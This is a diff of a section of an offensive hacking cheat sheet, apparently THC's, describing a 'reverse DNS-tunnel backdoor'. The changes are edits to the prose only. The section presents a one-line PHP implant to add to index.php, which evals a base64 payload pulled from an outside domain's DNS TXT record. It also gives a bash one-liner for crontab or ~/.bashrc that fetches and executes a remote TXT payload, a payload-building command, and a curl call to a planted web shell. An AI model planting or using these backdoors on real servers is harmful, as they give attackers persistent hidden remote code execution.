@@ -1832,23 +1832,22 @@ curl http://127.0.0.1:8080/x.php -d0='' -d1='echo file_get_contents("/etc/hosts"
 <a id="reverse-dns-backdoor"></a>
 **6.v. Smallest reverse DNS-tunnel Backdoor**
 
-Method to get access to a Web-Server that is not accessible from the public Internet. The backdoor uses DNS-TUNNELING to execute an arbitrary command on the Web-Server.
+Execute arbitrary commands on a server that is _not_ accessible from the public Internet by using a reverse DNS trigger.
 
 Add this implant to an index.php file (example):
 ```php
 <?PHP eval(base64_decode(dns_get_record("b00m.team-teso.net", DNS_TXT)[0]['txt'])); ?>
 ```
 
-The payload is stored in a DNS TXT record under `b00m.team-teso.net`. When triggered, it creates `/tmp/.b00m` and notifies THC (via an app.interactsh.com callback). *Please* create your own payload like so:
+The payload is stored in a DNS TXT record under the domain `b00m.team-teso.net`. When triggered, it creates `/tmp/.b00m` and notifies THC (via an app.interactsh.com callback). *Please* use your own domain and also create your own payload. Example:
 ```shell
 echo -n '@system("{ id; date;}>/tmp/.b00m 2>/dev/null");' |base64 -w0
 ```
-...and use your own domain (_not_ b00m.team-teso.net).
 
 - The TXT payload is limited to 2,048 characters (sometimes 65,535 characters).
-- It is a `bootloader` implant. Use a while loop to download larger implants via DNS.
+- It is a `bootloader` implant. Use a while loop to download and execute larger paypload via DNS.
 
-Works for `Bash` as well. Adding this to `crontab` or `~/.bashrc` yields similar results:
+Can also be triggered via `~/.bashrc` or the user's crontab. Use (example):
 ```shell
 bash -c 'exec bash -c "{ $(sed s/\"//g <(dig +short b00m2.team-teso.net TXT)|base64 -d);}"'&>/dev/null
 ```
